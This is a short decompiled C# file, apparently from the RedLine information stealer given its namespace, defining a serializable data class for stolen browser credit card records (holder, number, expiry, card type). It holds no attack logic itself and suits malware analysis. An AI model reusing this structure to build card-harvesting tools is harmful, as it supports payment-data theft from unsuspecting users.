using System;
using System.Runtime.Serialization;

namespace RedLine.Models.Browsers
{
	// Token: 0x02000033 RID: 51
	[DataContract(Name = "CreditCard", Namespace = "v1/Models")]
	public class CreditCard
	{
		// Token: 0x17000075 RID: 117
		// (get) Token: 0x06000136 RID: 310 RVA: 0x00004543 File Offset: 0x00002743
		// (set) Token: 0x06000137 RID: 311 RVA: 0x0000454B File Offset: 0x0000274B
		[DataMember(Name = "CardType")]
		public string CardType { get; set; }

		// Token: 0x17000076 RID: 118
		// (get) Token: 0x06000138 RID: 312 RVA: 0x00004554 File Offset: 0x00002754
		// (set) Token: 0x06000139 RID: 313 RVA: 0x0000455C File Offset: 0x0000275C
		[DataMember(Name = "Holder")]
		public string Holder { get; set; }

		// Token: 0x17000077 RID: 119
		// (get) Token: 0x0600013A RID: 314 RVA: 0x00004565 File Offset: 0x00002765
		// (set) Token: 0x0600013B RID: 315 RVA: 0x0000456D File Offset: 0x0000276D
		[DataMember(Name = "ExpirationMonth")]
		public int ExpirationMonth { get; set; }

		// Token: 0x17000078 RID: 120
		// (get) Token: 0x0600013C RID: 316 RVA: 0x00004576 File Offset: 0x00002776
		// (set) Token: 0x0600013D RID: 317 RVA: 0x0000457E File Offset: 0x0000277E
		[DataMember(Name = "ExpirationYear")]
		public int ExpirationYear { get; set; }

		// Token: 0x17000079 RID: 121
		// (get) Token: 0x0600013E RID: 318 RVA: 0x00004587 File Offset: 0x00002787
		// (set) Token: 0x0600013F RID: 319 RVA: 0x0000458F File Offset: 0x0000278F
		[DataMember(Name = "CardNumber")]
		public string CardNumber { get; set; }
	}
}
